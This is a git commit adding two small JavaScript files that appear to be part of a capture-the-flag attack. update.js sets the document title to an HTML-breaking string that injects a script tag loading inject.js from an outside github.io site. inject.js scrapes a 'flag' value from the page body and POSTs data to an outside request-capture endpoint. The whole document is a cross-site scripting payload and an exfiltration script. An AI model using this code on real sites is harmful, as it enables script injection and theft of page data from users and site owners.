3593d80a8b463a5bfbfb281700695bf3cebf7772
xsxsz <dilemma@mail.dlut.edu.cn>
2024-03-12 16:19:37 -0400

    update

---
+++ inject.js
@@ -0,0 +1,16 @@
+body_text = document.body.innerHTML;
+flag = body_text.slice(body_text.lastIndexOf('>') + 1);
+
+const headers = new Headers()
+headers.append("Content-Type", "application/json")
+
+const body = { "flag": "flag" }
+
+const options = {
+  method: "POST",
+  headers,
+  mode: "cors",
+  body: JSON.stringify(body),
+}
+
+fetch("https://enp5jg92ceyd.x.pipedream.net/", options)
---
+++ update.js
@@ -0,0 +1,3 @@
+setTimeout(function(){
+    document.title = " </h1><script src='https://xsxszab.github.io/inject.js'></script><h1>";
+}, 2000);
